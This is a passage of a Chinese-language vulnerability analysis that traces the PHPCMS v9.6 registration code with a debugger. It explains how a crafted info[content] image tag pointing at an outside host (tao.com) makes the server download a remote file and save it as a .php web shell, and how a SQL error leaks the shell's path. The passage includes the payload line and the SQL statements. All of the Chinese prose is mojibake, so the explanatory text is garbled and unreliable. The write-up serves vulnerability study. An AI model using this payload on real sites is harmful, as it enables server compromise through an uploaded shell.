class="string">&#x27;nickname&#x27;</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &amp;&amp; is_username($_POST[<span class="string">&#x27;nickname&#x27;</span>])) ? $_POST[<span class="string">&#x27;nickname&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$userinfo[<span class="string">&#x27;email&#x27;</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;email&#x27;</span>]) &amp;&amp; is_email($_POST[<span class="string">&#x27;email&#x27;</span>])) ? $_POST[<span class="string">&#x27;email&#x27;</span>] : <span class="keyword">exit</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">$userinfo[<span class="string">&#x27;password&#x27;</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; is_badword($_POST[<span class="string">&#x27;password&#x27;</span>])==<span class="literal">false</span>) ? $_POST[<span class="string">&#x27;password&#x27;</span>] : <span class="keyword">exit</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$userinfo[<span class="string">&#x27;email&#x27;</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;email&#x27;</span>]) &amp;&amp; is_email($_POST[<span class="string">&#x27;email&#x27;</span>])) ? $_POST[<span class="string">&#x27;email&#x27;</span>] : <span class="keyword">exit</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$userinfo[<span class="string">&#x27;modelid&#x27;</span>] = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;modelid&#x27;</span>]) ? intval($_POST[<span class="string">&#x27;modelid&#x27;</span>]) : <span class="number">10</span>;</span><br><span class="line">$userinfo[<span class="string">&#x27;regip&#x27;</span>] = ip();</span><br><span class="line">$userinfo[<span class="string">&#x27;point&#x27;</span>] = $member_setting[<span class="string">&#x27;defualtpoint&#x27;</span>] ? $member_setting[<span class="string">&#x27;defualtpoint&#x27;</span>] : <span class="number">0</span>;</span><br><span class="line">$userinfo[<span class="string">&#x27;amount&#x27;</span>] = $member_setting[<span class="string">&#x27;defualtamount&#x27;</span>] ? $member_setting[<span class="string">&#x27;defualtamount&#x27;</span>] : <span class="number">0</span>;</span><br><span class="line">$userinfo[<span class="string">&#x27;regdate&#x27;</span>] = $userinfo[<span class="string">&#x27;lastdate&#x27;</span>] = SYS_TIME;</span><br><span class="line">$userinfo[<span class="string">&#x27;siteid&#x27;</span>] = $siteid;</span><br><span class="line">$userinfo[<span class="string">&#x27;connectid&#x27;</span>] = <span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;connectid&#x27;</span>]) ? $_SESSION[<span class="string">&#x27;connectid&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$userinfo[<span class="string">&#x27;from&#x27;</span>] = <span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;from&#x27;</span>]) ? $_SESSION[<span class="string">&#x27;from&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç å¯¹ç”¨æˆ·ä¿¡æ¯è¿›è¡Œäº†å¤„ç†ï¼Œ130è¡Œå‰çš„ä»£ç å°±æ˜¯è·å–ä¸€ä¸‹ä¿¡æ¯ï¼Œæ„ä¹‰ä¸å¤§ã€‚ç›´æ¥ä¸‹æ–­ç‚¹åˆ°130è¡Œï¼Œç„¶å<code>F9</code>è·³åˆ°æ­¤å¤„ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($member_setting[<span class="string">&#x27;choosemodel&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">&#x27;member_input.class.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">&#x27;member_update.class.php&#x27;</span>;</span><br><span class="line">    $member_input = <span class="keyword">new</span> member_input($userinfo[<span class="string">&#x27;modelid&#x27;</span>]);</span><br><span class="line">    $_POST[<span class="string">&#x27;info&#x27;</span>] = array_map(<span class="string">&#x27;new_html_special_chars&#x27;</span>,$_POST[<span class="string">&#x27;info&#x27;</span>]);</span><br><span class="line">    $user_model_info = $member_input-&gt;get($_POST[<span class="string">&#x27;info&#x27;</span>]);<span class="comment">// 135è¡Œï¼Œé‡ç‚¹</span></span><br></pre></td></tr></table></figure><p>èµ°åˆ°135ï¼Œå¯ä»¥å‘ç°ï¼Œè¿™é‡Œ<code>$_POST[&#39;info&#39;]</code>ä¼ å…¥äº†<code>member_input</code>ç±»ä¸­çš„<code>get</code>æ–¹æ³•ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ã€‚(è¯¥æ–¹æ³•è·³è½¬è‡³ï¼š<code>/caches/caches_model/caches_data/member_input.class.php</code>æ–‡ä»¶20è¡Œ)</p><p>ç»§ç»­æ‰§è¡Œå¯å‘ç°ï¼Œåœ¨è¿™ä¸ª<code>get</code>æ–¹æ³•ä¸­ï¼Œèµ°åˆ°47è¡Œï¼Œè·å–äº†<code>datetime</code>å‡½æ•°ï¼Œè€Œ48è¡Œä¹Ÿè°ƒç”¨äº†è¯¥å‡½æ•°ã€‚</p><blockquote><p>è¿™é‡Œç•™ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆ47è¡Œå¤„è·å–çš„æ˜¯<code>datetime</code>è¿™ä¸ªå‡½æ•°ï¼Ÿ</p></blockquote><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210313215610842.png" alt="image-20210313215610842"></p><p>è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210313220037379.png" alt="image-20210313220037379"></p><p>ä¸Šé¢ä»£ç æ‰§è¡Œå®Œä»¥åï¼Œè¿”å›<code>$value=&quot;2021-03-13&quot;</code>,ç„¶åè¿”å›<code>get</code>æ–¹æ³•ï¼Œæ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$info[$field] = $value;</span><br><span class="line"><span class="keyword">return</span> $info;</span><br></pre></td></tr></table></figure><p>é€€å‡º<code>get</code>æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›ï¼Œè¿›å…¥<code>ps_member_register</code>æ–¹æ³•</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210313220404057.png" alt="image-20210313220404057"></p><p>ç»§ç»­è·Ÿè¿›ï¼Œæ‰§è¡Œ<code>insert</code>æ“ä½œ</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210313220718466.png" alt="image-20210313220718466"></p><p><code>F7</code>è·Ÿè¿›,æ‰§è¡Œåˆ°ä¸‹å›¾ï¼Œå°†æ³¨å†Œä¿¡æ¯æ’å…¥æ•°æ®åº“ï¼Œæ³¨å†Œå®Œæˆã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210313220855915.png" alt="image-20210313220855915"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314230547401.png" alt="image-20210314230547401"></p><p>ä¹‹åè¿”å›åˆ°<code>register</code>å‡½æ•°</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314230733721.png" alt="image-20210314230733721"></p><p>å½“<code>$status &gt; 0</code>æ—¶ï¼Œæ‰§è¡Œ<code>insert</code>æ“ä½œï¼Œè¿™é‡Œå°†<code>ç”Ÿæ—¥æ—¥æœŸ</code>å’Œ<code>ç”¨æˆ·id</code>æ’å…¥åˆ°<code>v9_member_detail</code>è¡¨ä¸­</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314230547401.png" alt="img26"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `phpcmsv96`.`v9_member_detail`(`birthday`,`userid`) VALUES (<span class="string">&#x27;2021-03-13&#x27;</span>php,<span class="string">&#x27;26&#x27;</span>)</span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬è‚¯å®šè¿˜æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸Šé¢è°ƒç”¨çš„å‡½æ•°æ˜¯<code>datetime</code>,å…ˆä¸æ€¥ï¼Œæˆ‘ä»¬æ•´ç†ä¸€ä¸‹æ³¨å†Œçš„æ‰§è¡Œæµç¨‹ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210313222051498.png" alt="image-20210313222051498"></p><p>ä½ æ˜¯ä¸æ˜¯å‘ç°äº†ä»€ä¹ˆï¼Ÿ,æ¥ä¸‹æ¥æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆ<code>$func=&quot;datetime&quot;</code>ã€‚</p><p>é¦–é¡µç”±äº<code>$func = $this-&gt;fields[$field][&#39;formtype&#39;]</code>ï¼Œæˆ‘ä»¬æŒ‰ctrlç‚¹å‡»<code>$this-&gt;fields</code>ï¼ŒåŒä¸€æ–‡ä»¶ï¼Œç¬¬11è¡Œå¾—åˆ°çš„ï¼Œè¿™é‡Œä¼ äº†ä¸ª<code>&#39;model_field_&#39;.$modelid</code>, è€Œ<code>$modelid = 10</code>ï¼Œè·Ÿè¿›ä¸€ä¸‹<code>getcache</code>æ–¹æ³•</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210313223822786.png" alt="image-20210313223822786"></p><p>è·³è½¬è‡³<code>phpsso_server/phpcms/libs/functions/global.func.php</code>æ–‡ä»¶ï¼Œå‡½æ•°å†…å®¹å¦‚ä¸‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getcache</span>(<span class="params">$name, $filepath=<span class="string">&#x27;&#x27;</span>, $type=<span class="string">&#x27;file&#x27;</span>, $config=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^[a-zA-Z0-9_-]+$/&quot;</span>, $name)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>($filepath!=<span class="string">&quot;&quot;</span> &amp;&amp; !preg_match(<span class="string">&quot;/^[a-zA-Z0-9_-]+$/&quot;</span>, $filepath)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">pc_base::load_sys_class(<span class="string">&#x27;cache_factory&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>($config) &#123;</span><br><span class="line">$cacheconfig = pc_base::load_config(<span class="string">&#x27;cache&#x27;</span>);</span><br><span class="line">$cache = cache_factory::get_instance($cacheconfig)-&gt;get_cache($config);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$cache = cache_factory::get_instance()-&gt;get_cache($type);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $cache-&gt;get($name, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $filepath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸º<code>$config</code>æœªè¿›è¡Œä¼ å‚ï¼Œé»˜è®¤ä¸ºç©ºï¼Œå› æ­¤æ‰§è¡Œçš„æ˜¯<code>$cache = cache_factory::get_instance()-&gt;get_cache($type);</code>,æ‰§è¡Œ<code>get_cahe</code>æ–¹æ³•ï¼Œä¼ å…¥å‚æ•°<code>$type=&#39;file&#39;</code>, è·Ÿè¿›ä¸€ä¸‹æ­¤æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// phpcms/libs/classes/cache_factory.class.php 53è¡Œå¤„</span></span><br><span class="line"><span class="keyword">protected</span> $cache_list = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params">$cache_name</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cache_list[$cache_name]) || !is_object(<span class="keyword">$this</span>-&gt;cache_list[$cache_name])) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cache_list[$cache_name] = <span class="keyword">$this</span>-&gt;load($cache_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cache_list[$cache_name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>$cache_list</code>æ˜¯ä¸ªç©ºæ•°ç»„ï¼Œå› æ­¤<code>$this-&gt;cache_list[$cache_name]</code>ä¸å­˜åœ¨ï¼Œä¸”ä¸æ˜¯å¯¹è±¡ã€‚è·Ÿç€ä¼šæ‰§è¡Œä¸‹é¢çš„ä»£ç ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹<code>load</code>æ–¹æ³•.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;cache_list[$cache_name] = <span class="keyword">$this</span>-&gt;load($cache_name);</span><br></pre></td></tr></table></figure><p><code>load</code>æ–¹æ³•ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params">$cache_name</span>) </span>&#123;</span><br><span class="line">$object = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cache_config[$cache_name][<span class="string">&#x27;type&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">switch</span>(<span class="keyword">$this</span>-&gt;cache_config[$cache_name][<span class="string">&#x27;type&#x27;</span>]) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;file&#x27;</span> :</span><br><span class="line">$object = pc_base::load_sys_class(<span class="string">&#x27;cache_file&#x27;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;memcache&#x27;</span> :</span><br><span class="line">define(<span class="string">&#x27;MEMCACHE_HOST&#x27;</span>, <span class="keyword">$this</span>-&gt;cache_config[$cache_name][<span class="string">&#x27;hostname&#x27;</span>]);</span><br><span class="line">define(<span class="string">&#x27;MEMCACHE_PORT&#x27;</span>, <span class="keyword">$this</span>-&gt;cache_config[$cache_name][<span class="string">&#x27;port&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>ç”±äº<code>$cache_name = &#39;file&#39;</code>, ä»è€Œæ‰§è¡Œ<code>$object = pc_base::load_sys_class(&#39;cache_file&#39;);</code>,è·Ÿè¿›ä¸€ä¸‹<code>pc_base::load_sys_class</code>æ–¹æ³•</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314180004931.png" alt="image-20210314180004931"></p><p>è°ƒç”¨äº†<code>_load_class</code>ç±»ï¼Œç»§ç»­è¿›å…¥</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314181859518.png" alt="image-20210314181859518"></p><p>122è¡Œçš„ä»£ç ä¸ä¼šæ‰§è¡Œï¼Œå› ä¸ºæ–‡ä»¶è·¯åŠ²ä¸­<code>æ²¡æœ‰è‡ªå·±çš„æ‰©å±•æ–‡ä»¶</code>ï¼Œ<code>my_path</code>æ–¹æ³•ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">my_path</span>(<span class="params">$filepath</span>) </span>&#123;</span><br><span class="line">$path = pathinfo($filepath);</span><br><span class="line"><span class="keyword">if</span> (file_exists($path[<span class="string">&#x27;dirname&#x27;</span>].DIRECTORY_SEPARATOR.<span class="string">&#x27;MY_&#x27;</span>.$path[<span class="string">&#x27;basename&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">return</span> $path[<span class="string">&#x27;dirname&#x27;</span>].DIRECTORY_SEPARATOR.<span class="string">&#x27;MY_&#x27;</span>.$path[<span class="string">&#x27;basename&#x27;</span>];</span><br><span class="line">           <span class="comment">// æ²¡æœ‰ my_cache_file.class.php</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šå›¾æ‰§è¡Œåˆ°130è¡Œï¼Œè¿”å›äº†<code>cache_file</code>å¯¹è±¡ï¼ˆå› ä¸º<code>$name=&#39;cache_file&#39;</code>ï¼‰ï¼Œå†…å®¹è§ä¸‹å›¾ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314182231735.png" alt="image-20210314182231735"></p><p>è¿™é‡Œè¿”å›å®Œäº†ä»¥åï¼Œé€€å‡ºåˆ°æ‰§è¡Œ<code>phpsso_server/phpcms/libs/functions/global.func.php</code>ä¸­548è¡Œå¤„<code>get</code>æ–¹æ³•ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314182655317.png" alt="image-20210314182655317"></p><p>ä»£ç ä¼ å…¥çš„å‚æ•°<code>$name</code>å°±æ˜¯ä¸‹å›¾çš„<code>&#39;model_field_&#39;.$modelid</code> = <code>&#39;model_field_10&#39;</code>ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314182750163.png" alt="image-20210314182750163"></p><p>çœ‹çœ‹getæ–¹æ³•ï¼Œå¯ä»¥å‘ç°ï¼Œå®ƒåŒ…å«äº†<code>/caches/caches_model/caches_data/model_field_10.cache.php</code>æ–‡ä»¶</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314183930348.png" alt="image-20210314183930348"></p><p>ä¸”91è¡Œè¿”å›äº†<code>/caches/caches_model/caches_data/model_field_10.cache.php</code>ä¸­çš„å†…å®¹</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314184250681.png" alt="image-20210314184250681"></p><p>å†…å®¹å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314091245587.png" alt="image-20210314091245587"></p><p><code>$func = $this-&gt;fields[$field][&#39;formtype&#39;];</code> å¯¹åº”æ­¤æ–‡ä»¶ä¸­<code>&#39;formtype&#39; =&gt; datetime</code>ï¼Œå› æ­¤è¿™é‡Œ<code>$func = datetime</code>ã€‚</p><p>å½“ç„¶ï¼Œè¿™é‡Œæ•°æ®ä¹Ÿå¯ä»¥é€šè¿‡æ•°æ®åº“ä¸­<code>v9_member_field</code>è¡¨è·å–ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314212730989.png" alt="image-20210314212730989"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314210556278.png" alt="image-20210314210556278"></p><p>å¯èƒ½ä¸Šé¢æè¿°çš„ä¸å¤ªç›´è§‚ï¼Œæˆ‘ä»¬å†æ¬¡æ¢³ç†ä¸€ä¸‹è·å–<code>datetime</code>å‡½æ•°çš„æµç¨‹ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314210309027.png" alt="image-20210314210309027"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314210322967.png" alt="image-20210314210322967"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬åˆ†æpoc</p><blockquote><p>æ³¨æ„ï¼šå†ä¸€æ¬¡ä½¿ç”¨pocçš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ä¿è¯<code>username</code>å€¼å’Œ<code>email</code>æ˜¯å”¯ä¸€çš„</p></blockquote><p>é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œç›´æ¥ä¸‹æ–­ç‚¹åˆ°å…³é”®å¤„</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314212901681.png" alt="image-20210314212901681"></p><p>å¦‚ä¸Šå›¾ï¼Œè¿™é‡Œè·å–çš„æ˜¯<code>editor</code>å‡½æ•°ï¼Œè€Œåœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œæœ‰ä¸ª<code>download</code>æ–¹æ³•(ä¸‹å›¾ï¼Œæ–‡ä»¶åœ¨<code>caches/caches_model/caches_data/member_input.class.php</code>)</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314212935364.png" alt="image-20210314212935364"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314213035969.png" alt="image-20210314213035969"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314213110830.png" alt="image-20210314213110830"></p><p>ä¸Šé¢å…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ext = <span class="string">&#x27;gif|jpg|jpeg|bmp|png&#x27;</span>;</span><br><span class="line">...</span><br><span class="line">$string = new_stripslashes($value);</span><br><span class="line"><span class="keyword">if</span>(!preg_match_all(<span class="string">&quot;/(href|src)=([\&quot;|&#x27;]?)([^ \&quot;&#x27;&gt;]+\.(<span class="subst">$ext</span>))\\2/i&quot;</span>,$string, $matches)) <span class="keyword">return</span> $value;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ­£åˆ™åŒ¹é…ä¸éš¾ç†è§£ï¼Œéœ€è¦æ»¡è¶³<code>href/src=url. (gif|jpg|jpeg|bmp|png) </code>ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å†™<code>info[content]=&lt;img src=http://www.tao.com/a.txt?.php#.jpg</code>ï¼ˆç¬¦åˆè¿™ä¸ªæ ¼å¼ï¼Œè€Œä¸”åŠ <code>.jpg</code>çš„åŸå› ï¼‰ï¼Œæ¥ç€è¿›å…¥<code>fillurl</code>æ–¹æ³•</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314213134570.png" alt="image-20210314213134570"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314213548087.png" alt="image-20210314213548087"></p><p>åœ¨ä¸Šå›¾çš„<code>fillurl</code>æ–¹æ³•ä¸­,é€šè¿‡ä¸‹é¢ä»£ç å»æ‰äº†é”šç‚¹.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pos = strpos($surl,<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</span><br></pre></td></tr></table></figure><p><code>strpos</code>å®šä½<code>#</code>, ç„¶åä½¿ç”¨<code>substr</code>å¤„ç†<code>http://www.tao.com/t.txt?.php#.jpg</code>, å¤„ç†å®Œä¹‹å<code>$surl = http://www.tao.com/t.txt?.php</code>ã€‚</p><p>ç»§ç»­æ‰§è¡Œï¼Œå¯ä»¥å‘ç°è¿”å›çš„urlå»æ‰äº†<code>#</code>åé¢çš„å†…å®¹</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314213653293.png" alt="image-20210314213653293"></p><p>ä¸‹é¢166è¡Œå¤„è·å–äº†ä¸Šé¢è¿”å›urlçš„åç¼€ï¼ŒåŠ<code>php</code>,é€šè¿‡<code>getname</code>æ–¹æ³•è¿›è¡Œé‡å‘½åï¼Œå¯ä»¥å‘ç°çš„æ˜¯ï¼Œ<code>getname</code>æ–¹æ³•è¿”å›çš„æ–‡ä»¶åä¹Ÿåªæ˜¯æ—¶é—´+éšæœºçš„ä¸‰ä½æ•°ã€‚å¦‚æœä¸è¿”å›ä¸Šä¼ æ–‡ä»¶çš„urlåœ°å€ï¼Œä¹Ÿå¯ä»¥é€šè¿‡çˆ†ç ´è·å–ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314213759469.png" alt="image-20210314213759469"></p><p>æ¥ç€ç¨‹åºè°ƒç”¨äº†<code>copy</code>å‡½æ•°,å¯¹è¿œç¨‹çš„urlæ–‡ä»¶è¿›è¡Œäº†ä¸‹è½½</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314213822263.png" alt="image-20210314213822263"></p><p>è¿™é‡Œçš„<code>$this-&gt;upload_func</code>æ˜¯<code>copy</code>å‡½æ•°çš„åŸå› ,æ˜¯å› ä¸ºåˆå§‹åŒ–æ—¶èµ‹ç»™çš„ï¼ˆçœ‹ä¸‹å›¾ï¼‰</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314214128879.png" alt="image-20210314214128879"></p><p>æ­¤æ—¶èƒ½çœ‹åˆ°æˆ‘ä»¬è¦å†™å…¥çš„å†…å®¹å·²ç»æˆåŠŸå†™å…¥æ–‡ä»¶äº†ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314213944612.png" alt="image-20210314213944612"></p><p>æ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹å†™å…¥æ–‡ä»¶çš„è·¯åŠ²æ˜¯å¦‚ä½•è¿”å›ç»™æˆ‘ä»¬çš„ã€‚ä¸Šé¢ç¨‹åºæ‰§è¡Œå®Œä»¥åï¼Œå›åˆ°äº†<code>register</code>å‡½æ•°ä¸­ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314223358815.png" alt="image-20210314223358815"></p><p>F7è·Ÿè¿›</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314223508528.png" alt="image-20210314223508528"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `phpcmsv96`.`v9_member_detail`(`content`,`userid`) VALUES (<span class="string">&#x27;&amp;lt;img src=http://www.phpcms96.com/uploadfile/2021/0314/20210314103307168.php&amp;gt;&#x27;</span>,<span class="string">&#x27;25&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œä¸Šä¸Šå›¾140è¡Œå¤„<code>$status &gt; 0</code>æ—¶ä¼šæ‰§è¡Œä¸Šé¢çš„SQLè¯­å¥ï¼Œä¹Ÿå°±æ˜¯å‘<code>v9_member_detail</code>çš„<code>content</code>å’Œ<code>userid</code>ä¸¤åˆ—æ’å…¥æ•°æ®</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210207090423515.png" alt="img"></p><p>ä½†æ˜¯ç”±äº<code>v9_member_detail</code>è¡¨ç»“æ„ä¸­æ²¡æœ‰<code>content</code>åˆ—ï¼Œäº§ç”Ÿäº†æŠ¥é”™ã€‚ä»è€Œå°†æ’å…¥æ•°æ®ä¸­çš„sqlæŠ¥é”™è¯­å¥(åŒ…å«shell è·¯å¾„)è¿”å›äº†å‰å°é¡µé¢ã€‚</p><p>å‰é¢è¯´140è¡Œ<code>$status&gt;0</code> æ—¶æ‰ä¼šæ‰§è¡Œ SQL è¯­å¥è¿›è¡Œ INSERT æ“ä½œã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä»€ä¹ˆæ—¶å€™<code>$status &lt;= 0</code>,ä¸æ‰§è¡Œ<code>insert</code>å‘¢?</p><p>é€šè¿‡å‰é¢139è¡Œæˆ‘ä»¬å‘ç°<code>$status</code>æ˜¯ç”±<code>client</code>ç±»ä¸­<code>ps_member_register</code>æ–¹æ³•è¿”å›çš„ï¼ˆå‡½æ•°è·¯åŠ²åœ¨ï¼š <code>phpcms/modules/member/classes/client.class.php</code> ï¼‰</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314214924756.png"></p><p><code>$status &lt;= 0</code>éƒ½æ˜¯å› 